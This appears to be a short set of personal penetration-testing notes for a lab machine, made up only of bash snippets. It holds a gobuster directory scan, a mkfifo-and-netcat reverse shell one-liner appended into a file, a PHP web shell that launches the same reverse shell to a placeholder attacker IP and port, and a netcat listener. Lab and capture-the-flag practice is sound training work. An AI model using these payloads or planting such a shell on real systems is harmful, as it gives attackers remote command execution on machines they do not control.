```bash
gobuster dir -u http://10.129.245.108 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port ecouté} >/tmp/f' | tee -a {file}
```

```bash
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Attack IP} {Listening port} >/tmp/f"); ?>
```

```bash
nc -lvpn {port}
```